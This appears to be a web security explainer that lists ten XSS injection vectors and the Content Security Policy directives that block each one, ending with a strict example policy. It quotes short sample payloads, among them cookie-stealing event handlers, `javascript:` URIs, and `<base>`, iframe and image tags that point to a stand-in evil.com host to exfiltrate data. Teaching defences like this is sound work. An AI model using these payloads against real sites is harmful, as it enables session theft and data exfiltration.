## 10 Features Manipulated for XSS and How CSP Disables Them

Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking, and other code injection attacks by declaring approved origins of content that browsers should be allowed to load. When CSP is enforced, a number of browser features are **disabled by default** and must be explicitly re-enabled through directives. [en.wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)

***

### 1. Inline `<script>` Blocks

Inline JavaScript like `<script>alert(1)</script>` is the most direct XSS vector — any injection point that accepts raw HTML can execute arbitrary code.

**How CSP disables it:** The `script-src` directive, if it does not include the `'unsafe-inline'` keyword, blocks all inline `<script>` blocks from executing. Only scripts loaded from allow-listed external sources (via `<script src>`) or those carrying a matching nonce/hash are permitted to run. [portswigger](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)

```
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m';
```

***

### 2. Inline Event Handler Attributes

HTML attributes like `onclick="..."`, `onerror="..."`, `onload="..."` allow JavaScript execution directly in markup without any `<script>` tag, making them a favorite XSS payload in injection contexts.

**How CSP disables it:** CSP treats inline event handler attributes as inline scripts. Without `'unsafe-inline'` in `script-src`, the browser refuses to execute any `on*` attribute handlers. The recommended replacement is `EventTarget.addEventListener()` in external script files. [github](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md)

```html
<!-- Blocked by CSP without 'unsafe-inline' -->
<div onclick="steal(document.cookie)">Click me</div>

<!-- Must be replaced with: -->
<!-- external.js: document.getElementById('x').addEventListener('click', ...) -->
```

***

### 3. `javascript:` URIs

The `javascript:` protocol in `href` or `src` attributes (`<a href="javascript:alert(1)">`) executes JavaScript when the link is activated, bypassing script-tag-based filtering.

**How CSP disables it:** `javascript:` URIs are treated as inline script execution. A CSP policy without `'unsafe-inline'` in `script-src` blocks navigation to `javascript:` URIs, preventing their execution. [security.stackexchange](https://security.stackexchange.com/questions/134078/xss-and-content-security-policy)

```
Content-Security-Policy: script-src 'self';
```

***

### 4. `eval()` and Dynamic Code Evaluation

`eval()` parses and executes arbitrary strings as JavaScript. If an attacker can influence the string passed to `eval()`, they achieve full script execution. This is especially dangerous when user input is concatenated into eval'd strings.

**How CSP disables it:** Unless the `'unsafe-eval'` keyword is present in `script-src`, the browser blocks all calls to `eval()`, throwing a CSP violation error. The recommended alternative is `JSON.parse()` for data parsing. [github](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md)

```
Content-Security-Policy: script-src 'self';  // no 'unsafe-eval' → eval() blocked
```

***

### 5. String Arguments to `setTimeout()` and `setInterval()`

Both `setTimeout("maliciousCode()", 100)` and `setInterval("code", 100)` accept string arguments that are implicitly `eval()`'d. An attacker who controls these strings achieves code execution.

**How CSP disables it:** CSP treats string arguments to `setTimeout`/`setInterval` as dynamic code evaluation — the same restriction that blocks `eval()`. Without `'unsafe-eval'` in `script-src`, these calls are blocked. The fix is to pass function references instead: `setTimeout(function() { ... }, 100)`. [en.wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)

***

### 6. `new Function()` Constructor

The `Function` constructor (`new Function("return alert(1)")()`) dynamically creates and executes JavaScript from strings, functioning as an alternative to `eval()`.

**How CSP disables it:** The `new Function()` constructor falls under the same `'unsafe-eval'` restriction as `eval()`. A CSP without `'unsafe-eval'` blocks the `Function` constructor from executing dynamically generated code. [github](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md)

***

### 7. `<base>` Element Injection

A `<base href="https://evil.com/">` tag, if injected early in a document, silently rewrites all relative URLs on the page — loading scripts, stylesheets, and images from an attacker-controlled origin.

**How CSP disables it:** The `base-uri` directive restricts which URLs can be set via the `<base>` element. Setting `base-uri 'self'` or `base-uri 'none'` prevents an injected `<base>` tag from redirecting resource loads to an attacker's server. Note: `base-uri` does **not** inherit from `default-src`, so it must be set explicitly. [dttdocumentation-uiadmin.nidirect.gov](https://dttdocumentation-uiadmin.nidirect.gov.uk/Engagement/HTTPHeaders/03-CSP.html)

```
Content-Security-Policy: base-uri 'self';
```

***

### 8. External Plugin Objects (`<object>`, `<embed>`, `<applet>`)

Legacy plugins loaded via `<object>`, `<embed>`, or `<applet>` tags can execute native code (Flash, Java applets, ActiveX). Attackers inject these tags to load malicious plugin content that bypasses JavaScript-level protections.

**How CSP disables it:** The `object-src` directive restricts the sources from which plugin content can be loaded. Setting `object-src 'none'` completely disables all plugin embedding, eliminating the attack surface. [owasp](https://owasp.org/www-community/controls/Content_Security_Policy)

```
Content-Security-Policy: object-src 'none';
```

***

### 9. Untrusted `<iframe>` Embedding (Frame Injection)

An attacker who can inject `<iframe src="https://evil.com/steal.html">` can load arbitrary external content in a nested browsing context, potentially performing clickjacking, phishing, or cross-origin data exfiltration.

**How CSP disables it:** Two complementary directives address this. `frame-src` restricts which URLs can be loaded in `<iframe>`/`<frame>` elements on the current page. `frame-ancestors` restricts which parent pages may embed **this** page, preventing clickjacking. [portswigger](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)

```
Content-Security-Policy: frame-src 'self'; frame-ancestors 'none';
```

***

### 10. Unrestricted Network Exfiltration (XHR, Fetch, WebSocket)

Even when script execution is blocked, an attacker may use HTML injection to exfiltrate data via `<img src="https://evil.com/?data=...">` or, if script execution succeeds, via `fetch()`/`XMLHttpRequest`/`WebSocket` to send stolen data to an external server.

**How CSP disables it:** The `connect-src` directive restricts the URLs accessible via `fetch()`, `XMLHttpRequest`, `WebSocket`, `EventSource`, and `Navigator.sendBeacon()`. The `img-src` directive restricts where `<img>` tags can load from, blocking the classic `<img src="evil.com/?token=...">` exfiltration vector. [gist.github](https://gist.github.com/oscarychen/c840ac6c4635b70101a16767e8a569a5)

```
Content-Security-Policy: connect-src 'self'; img-src 'self';
```

***

### Complete Strict CSP Example

A strict policy that disables all 10 features above:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-src 'none';
  frame-ancestors 'none';
  connect-src 'self';
  img-src 'self';
  style-src 'self';
  font-src 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-uri /csp-reports;
```

This policy: blocks inline scripts/event handlers/`javascript:` URIs (no `'unsafe-inline'`), blocks `eval()`/`setTimeout` strings/`new Function()` (no `'unsafe-eval'`), blocks `<base>` injection (`base-uri 'none'`), blocks all plugins (`object-src 'none'`), blocks frame injection (`frame-src 'none'`, `frame-ancestors 'none'`), and restricts network exfiltration (`connect-src 'self'`, `img-src 'self'`). [gist.github](https://gist.github.com/oscarychen/c840ac6c4635b70101a16767e8a569a5)

The `report-uri` directive ensures that any violation is logged, allowing you to detect attempted exploits in real time. The `strict-dynamic` keyword in `script-src` allows scripts loaded by an already-trusted (nonced) script to also execute, which is the modern recommended approach over domain allow-lists — those are vulnerable to bypass via JSONP endpoints or content-type sniffing on same-origin resources. [security.stackexchange](https://security.stackexchange.com/questions/134078/xss-and-content-security-policy)
